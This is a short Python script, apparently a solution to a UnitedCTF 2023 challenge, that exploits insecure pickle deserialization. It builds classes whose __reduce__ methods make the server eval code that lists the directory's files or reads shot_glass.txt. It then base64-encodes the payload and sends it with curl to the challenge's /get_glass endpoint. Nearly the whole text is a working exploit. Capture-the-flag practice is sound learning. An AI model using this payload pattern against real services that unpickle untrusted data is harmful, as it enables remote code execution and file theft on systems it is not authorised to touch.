import base64
import pickle
from typing import Any
import os
files = "cocktail_glass.txt mug.txt pilsner_glass.txt cup.txt pint_glass.txt shot_glass.txt"
files = files.split(' ')

class attack():
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (eval, ("' '.join([b for _,_,a in os.walk('.') for b in a])",))
    
class attack2():
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (eval, ("' '.join(open('shot_glass.txt', 'r').readlines())",))

data = base64.urlsafe_b64encode(pickle.dumps(attack2())).decode()
print(data, end="\n\n")
command = f"curl -X GET -d \"data={data}\" http://challenges.2023.unitedctf.ca:10867/get_glass"
print(command, end="\n\n")
print(os.popen(command).read())